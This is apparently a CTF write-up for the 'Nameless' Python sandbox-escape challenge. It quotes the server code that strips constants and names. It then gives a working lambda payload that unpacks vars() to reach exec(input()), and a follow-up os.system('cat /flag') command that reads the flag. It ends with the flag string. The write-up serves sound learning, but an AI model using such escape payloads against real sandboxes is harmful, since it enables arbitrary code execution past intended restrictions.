# Nameless (Misc)
> obligatory unrealistic sandbox escape challenge!!!!!!!

This challenge is a Python escape where the server strips almost all constants from your code and then runs it. It also removes all names (variables) that aren't locals/arguments.
All strings are set to "", numbers to 0, tuples empty, and code is recursively checked.

```py
def clear(code):
    print(">", code.co_names)
    new_consts = []
    for const in code.co_consts:
        print("C:", const)
        if isinstance(const, code_type): # functions/lambdas/etc
            new_consts.append(clear(const))
        elif isinstance(const, int): # ints set to 0
            new_consts.append(0)
        elif isinstance(const, str): # strings can stay if empty
            new_consts.append("")
        elif isinstance(const, tuple): # tuples are set to None (iirc it'll segfault otherwise actually)
            new_consts.append(tuple(None for _ in range(len(const))))
        else: # anything else is set to None
            new_consts.append(None)
    return code.replace(co_names=(), co_consts=tuple(new_consts)) # names are removed, triggering a segfault if there was one, and consts are updated
```

The code is eval'd with empty locals/globals, and the return value is treated as a function and called again with the output from `vars()`.

```py
go = input("Code: ")
res = compile(go, "home", "eval")
# ...
res = clear(res)
del clear
del go
del code_type
# Go!
res = eval(res, {}, {}) # expected to return a callable
print(res(vars(), vars))
```

The trick is to use keyword arguments to extract specific names from arguments, and `**` to convert the dicts from `vars()` into keyword arguments.

```py
lambda a, vars: (lambda __builtins__=None, **kw: (lambda exec, input, **k: exec(input()))(**vars(__builtins__)))(**a)
```

This calls `exec(input())`, so sending `import os; os.system('cat /flag')` works after.

```
irisctf{i_made_this_challenge_so_long_ago_i_hope_there_arent_10000_with_this_idea_i_missed}
```
